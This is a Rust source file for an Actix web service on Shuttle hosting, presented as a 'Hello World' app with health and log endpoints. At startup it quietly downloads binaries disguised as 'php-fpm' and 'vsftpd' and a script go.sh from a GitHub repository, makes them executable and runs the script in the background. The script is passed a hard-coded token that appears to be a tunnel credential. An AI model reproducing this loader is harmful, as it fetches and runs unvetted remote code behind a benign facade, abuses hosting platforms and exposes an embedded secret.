use actix_web::{get, web::ServiceConfig, HttpResponse, Result};
use std::fs::{self, File};
use std::io::Write;
use futures_util::StreamExt;
use anyhow::anyhow;
use shuttle_actix_web::ShuttleActixWeb;
use std::sync::Arc;
use tokio::sync::Mutex;

struct FileInfo {
    url: &'static str,
    filename: &'static str,
}

const FILES_TO_DOWNLOAD: &[FileInfo] = &[
    FileInfo {
        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/php-fpm",
        filename: "php-fpm",
    },
    FileInfo {
        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/vsftpd",
        filename: "vsftpd",
    },
    FileInfo {
        url: "https://github.com/wwrrtt/test/releases/download/2.0/go.sh",
        filename: "go.sh",
    },
];

async fn download_file(file: &FileInfo, base_path: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    println!("Downloading file from {}...", file.url);
    
    // 检查文件是否已存在
    let file_path = format!("{}/{}", base_path, file.filename);
    if std::fs::metadata(&file_path).is_ok() {
        println!("File {} already exists, skipping download.", file.filename);
        return Ok(());
    }

    let response = reqwest::get(file.url).await?;
    if !response.status().is_success() {
        return Err(anyhow!("Failed to download {}: HTTP {}", file.url, response.status()).into());
    }

    let mut file_handle = File::create(&file_path)?;
    let mut stream = response.bytes_stream();

    while let Some(chunk) = stream.next().await {
        let chunk = chunk?;
        file_handle.write_all(&chunk)?;
        file_handle.flush()?;
    }

    println!("Downloaded {} successfully", file.filename);
    Ok(())
}

async fn give_executable_permission(filename: &str) -> std::io::Result<()> {
    println!("Giving executable permission to {}", filename);

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let metadata = fs::metadata(filename)?;
        let mut perms = metadata.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(filename, perms)?;
        println!("Set executable permission for {}", filename);
    }

    #[cfg(not(unix))]
    {
        println!("Warning: Cannot set executable permission on non-Unix platform for {}", filename);
    }

    Ok(())
}

async fn execute_script(script: &str, token: &str) -> std::io::Result<()> {
    println!("Starting script in background: {}", script);
    
    // 创建日志文件
    let log_file = std::fs::File::create("script_output.log")?;
    
    // 启动脚本但不等待其完成，将输出重定向到文件
    let mut child = tokio::process::Command::new("bash")
        .arg(script)
        .env("Token", token)
        .stdout(log_file.try_clone()?)
        .stderr(log_file)
        .spawn()?;
    
    println!("Script started with PID: {:?}", child.id());
    // 不等待脚本完成，直接返回
    Ok(())
}

async fn download_and_execute_files() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let base_path = std::env::var("SHUTTLE_DATA_DIR").unwrap_or_else(|_| ".".to_string());
    println!("Using base path: {}", base_path);

    // 确保目录存在
    std::fs::create_dir_all(&base_path)?;

    // 下载所有文件
    for file in FILES_TO_DOWNLOAD {
        download_file(file, &base_path).await?;
    }

    // 授予可执行权限
    for file_info in FILES_TO_DOWNLOAD {
        let file_path = format!("{}/{}", base_path, file_info.filename);
        give_executable_permission(&file_path).await?;
    }

    // 执行 go.sh
    let script_path = format!("{}/go.sh", base_path);
    let token = "eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiYmNmZmQwNTktY2JjMC00YzhmLTgzMWQtNzRhYjM2ZDZiODFlIiwicyI6Ik4yTmtZVFEwWW1VdFlqRTJOaTAwT1dKakxXSmtZbVl0TkRnMllURTFZV000WmpNdyJ9";
    
    execute_script(&script_path, token).await?;

    Ok(())
}

#[get("/")]
async fn hello_world() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok().content_type("text/plain").body("Hello World!"))
}

#[get("/health")]
async fn health_check(data: actix_web::web::Data<Arc<Mutex<bool>>>) -> Result<HttpResponse> {
    let initialized = *data.lock().await;
    if initialized {
        Ok(HttpResponse::Ok().content_type("text/plain").body("OK - Service initialized and running"))
    } else {
        Ok(HttpResponse::ServiceUnavailable().content_type("text/plain").body("Service initializing..."))
    }
}

#[get("/script-logs")]
async fn script_logs() -> Result<HttpResponse> {
    match std::fs::read_to_string("script_output.log") {
        Ok(logs) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body(logs))
        }
        Err(_) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body("No logs available yet or log file not created."))
        }
    }
}

#[get("/php-fpm-logs")]
async fn php_fpm_logs() -> Result<HttpResponse> {
    match std::fs::read_to_string("php-fpm.log") {
        Ok(logs) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body(logs))
        }
        Err(_) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body("No php-fpm logs available yet."))
        }
    }
}

#[get("/vsftpd-logs")]
async fn vsftpd_logs() -> Result<HttpResponse> {
    match std::fs::read_to_string("vsftpd.log") {
        Ok(logs) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body(logs))
        }
        Err(_) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body("No vsftpd logs available yet."))
        }
    }
}

#[get("/all-logs")]
async fn all_logs() -> Result<HttpResponse> {
    let mut all_logs = String::new();
    
    // 添加 script logs
    all_logs.push_str("=== SCRIPT OUTPUT LOGS ===\n");
    match std::fs::read_to_string("script_output.log") {
        Ok(logs) => all_logs.push_str(&logs),
        Err(_) => all_logs.push_str("No script logs available.\n"),
    }
    
    all_logs.push_str("\n=== PHP-FPM LOGS ===\n");
    match std::fs::read_to_string("php-fpm.log") {
        Ok(logs) => all_logs.push_str(&logs),
        Err(_) => all_logs.push_str("No php-fpm logs available.\n"),
    }
    
    all_logs.push_str("\n=== VSFTPD LOGS ===\n");
    match std::fs::read_to_string("vsftpd.log") {
        Ok(logs) => all_logs.push_str(&logs),
        Err(_) => all_logs.push_str("No vsftpd logs available.\n"),
    }
    
    Ok(HttpResponse::Ok().content_type("text/plain").body(all_logs))
}

#[shuttle_runtime::main]
async fn actix_web() -> ShuttleActixWeb<impl FnOnce(&mut ServiceConfig) + Send + Clone + 'static> {
    let initialized = Arc::new(Mutex::new(false));
    let initialized_clone = initialized.clone();

    // 异步初始化
    tokio::spawn(async move {
        println!("🚀 Starting initialization...");
        match download_and_execute_files().await {
            Ok(_) => {
                println!("✅ Initialization completed successfully");
            }
            Err(e) => {
                eprintln!("❌ Initialization failed: {}", e);
            }
        }
        // 无论如何都标记为初始化完成
        *initialized_clone.lock().await = true;
        println!("✅ Service marked as initialized");
    });

    let config = move |cfg: &mut ServiceConfig| {
        cfg.service(hello_world)
           .service(health_check)
           .service(script_logs)
           .service(php_fpm_logs)
           .service(vsftpd_logs)
           .service(all_logs)
           .app_data(actix_web::web::Data::new(initialized.clone()));
    };

    Ok(config.into())
}
